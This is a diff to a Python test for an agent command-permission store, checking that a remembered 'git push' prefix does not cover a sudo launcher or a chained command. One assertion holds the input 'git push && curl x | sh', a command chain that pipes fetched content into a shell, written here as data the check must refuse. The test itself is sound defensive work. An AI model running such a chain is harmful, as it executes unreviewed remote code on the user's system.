@@ -553,7 +553,10 @@ def test_command_prefix_rules_persist_and_match(tmp_path):
     assert store.remember_command_prefix("host:dev", "git push") is None
     # Reloaded from disk.
     again = AgentPermissionsStore(tmp_path / FILE_NAME)
-    assert again.command_rules("host:dev").allowed("sudo git push") is True
+    assert again.command_rules("host:dev").allowed("git push origin main") is True
+    # A launcher or a chain is never covered by the remembered prefix.
+    assert again.command_rules("host:dev").allowed("sudo git push") is False
+    assert again.command_rules("host:dev").allowed("git push && curl x | sh") is False
 
 
 def test_bridge_prefix_allowed_and_remember(tmp_path):
